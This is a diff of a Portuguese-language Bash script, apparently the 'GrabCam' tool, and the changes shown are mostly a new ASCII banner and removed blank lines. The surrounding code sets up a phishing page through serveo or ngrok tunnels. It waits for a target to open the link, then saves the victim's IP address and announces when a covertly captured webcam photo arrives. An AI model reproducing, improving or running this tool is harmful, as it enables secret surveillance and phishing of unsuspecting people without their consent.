@@ -6,14 +6,16 @@ pkg install wget -y
 clear
 trap 'printf "\n";stop' 2
 banner() {
-printf "      \e[1;77m v1.0 coded by github.com/SamSepi0l13\e[0m \n"
-printf "          \e[1;77m v1.0\e[0m \n"
-
-printf "\n"
-
-echo "      N073:> LINK " 
-                  
-
+echo "============================================================";
+echo " ██████╗ ██████╗  █████╗ ██████╗  ██████╗ █████╗ ███╗   ███╗";
+echo "██╔════╝ ██╔══██╗██╔══██╗██╔══██╗██╔════╝██╔══██╗████╗ ████║";
+echo "██║  ███╗██████╔╝███████║██████╔╝██║     ███████║██╔████╔██║";
+echo "██║   ██║██╔══██╗██╔══██║██╔══██╗██║     ██╔══██║██║╚██╔╝██║";
+echo "╚██████╔╝██║  ██║██║  ██║██████╔╝╚██████╗██║  ██║██║ ╚═╝ ██║";
+echo " ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝  ╚═════╝╚═╝  ╚═╝╚═╝     ╚═╝";
+echo "============================================================";
+echo "        v1.0 coded by github.com/SamSepi0l13"                
+echo "        ====================================";
 }
 
 stop() {
@@ -32,41 +34,28 @@ if [[ $checkssh == *'ssh'* ]]; then
 killall -2 ssh > /dev/null 2>&1
 fi
 exit 1
-
 }
 
 dependencies() {
-
-
 command -v php > /dev/null 2>&1 || { echo >&2 "Necessita de ter o PHP instalado."; exit 1; }
- 
-
-
 }
 
 catch_ip() {
-
 ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
 IFS=$'\n'
 printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] IP:\e[0m\e[1;77m %s\e[0m\n" $ip
-
 cat ip.txt >> saved.ip.txt
-
-
 }
 
 checkfound() {
-
 printf "\n"
 printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m]Esperando a alvo,\e[0m\e[1;77m Pressione Ctrl + C para sair...\e[0m\n"
 while [ true ]; do
-
 
 if [[ -e "ip.txt" ]]; then
 printf "\n\e[1;92m[\e[0m+\e[1;92m] O alvo abriu o Link!\n"
 catch_ip
 rm -rf ip.txt
-
 fi
 
 sleep 0.5
@@ -76,11 +65,8 @@ printf "\n\e[1;92m[\e[0m+\e[1;92m] Foto Recebida!\e[0m\n"
 rm -rf Log.log
 fi
 sleep 0.5
-
 done 
-
 }
-
 
 server() {
     command -v ssh > /dev/null 2>&1 || { echo >&2 "Necessita do SSH instalado."; exit 1; }
@@ -113,19 +99,13 @@ server() {
     fi
 }
 
-
 payload_ngrok() {
-
 link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9A-Za-z.-]*\.ngrok.io")
 sed 's+forwarding_link+'$link'+g' grabcam.html > index2.html
 sed 's+forwarding_link+'$link'+g' template.php > index.php
-
-
 }
 
 ngrok_server() {
-
-
 if [[ -e ngrok ]]; then
 echo ""
 else
@@ -202,17 +182,13 @@ fi
 
 
 payload() {
-
 send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
 
 sed 's+forwarding_link+'$send_link'+g' grabcam.html > index2.html
 sed 's+forwarding_link+'$send_link'+g' template.php > index.php
-
-
 }
 
 start() {
-
 default_choose_sub="Y"
 default_subdomain="grabcam$RANDOM"
 
@@ -229,7 +205,6 @@ fi
 server
 payload
 checkfound
-
 }
 
 banner
